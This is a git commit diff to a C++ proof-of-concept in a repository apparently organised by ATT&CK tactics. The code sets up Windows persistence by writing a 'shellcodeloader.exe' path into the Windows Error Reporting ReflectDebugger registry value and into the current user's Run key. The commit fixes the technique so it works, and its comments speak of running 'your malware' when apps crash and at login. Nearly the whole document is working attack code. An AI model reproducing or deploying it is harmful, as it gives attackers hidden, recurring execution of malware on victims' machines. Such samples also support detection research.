b0a2133c9bf33f436ab30e234247d59137493447
BlueTrust <92355496+Sohrabian@users.noreply.github.com>
2025-09-17 12:27:21 +0330

    Update werfault.cpp

--- TA0003 Persistence/werfault/werfault.cpp
+++ TA0003 Persistence/werfault/werfault.cpp
@@ -13,26 +13,31 @@ Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
 int main(int argc, char* argv[]) {
     HKEY hkey = NULL;
 
-    // malicious app - This shellCodeLoader is Detected with Defender
-    const wchar_t* exe = L"C:\\werfault-hack\\shellcodeloader.exe";
+    // CORRECTED: WER hijacking requires the full command line including original parameters
+    const wchar_t* werDebugger = L"\"C:\\werfault-hack\\shellcodeloader.exe\" -pr 1";
 
-    // hijacked app
-    const wchar_t* wf = L"WerFault.exe -pr 1";
+    // CORRECTED: Startup entry should point to your malicious executable, not WerFault
+    const wchar_t* startupExe = L"\"C:\\werfault-hack\\shellcodeloader.exe\"";
 
-    // set evil app
-    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0, KEY_WRITE, &hkey);
+    // Set WER hijacking - this will execute your malware when apps crash
+    LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
+        L"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs",
+        0, KEY_WRITE, &hkey);
     if (res == ERROR_SUCCESS) {
-        // create new registry key
-        RegSetValueEx(hkey, L"ReflectDebugger", 0, REG_SZ, (const BYTE*)exe, (wcslen(exe) + 1) * sizeof(wchar_t));
+        RegSetValueEx(hkey, L"ReflectDebugger", 0, REG_SZ,
+            (const BYTE*)werDebugger, (wcslen(werDebugger) + 1) * sizeof(wchar_t));
         RegCloseKey(hkey);
     }
 
-    // startup
-    res = RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
+    // Set startup persistence - this will run your malware on user login
+    res = RegOpenKeyEx(HKEY_CURRENT_USER,
+        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, KEY_WRITE, &hkey);
     if (res == ERROR_SUCCESS) {
-        // create new registry key
-        RegSetValueEx(hkey, L"meow", 0, REG_SZ, (const BYTE*)wf, (wcslen(wf) + 1) * sizeof(wchar_t));
+        RegSetValueEx(hkey, L"apk", 0, REG_SZ,
+            (const BYTE*)startupExe, (wcslen(startupExe) + 1) * sizeof(wchar_t));
         RegCloseKey(hkey);
     }
+
     return 0;
 }
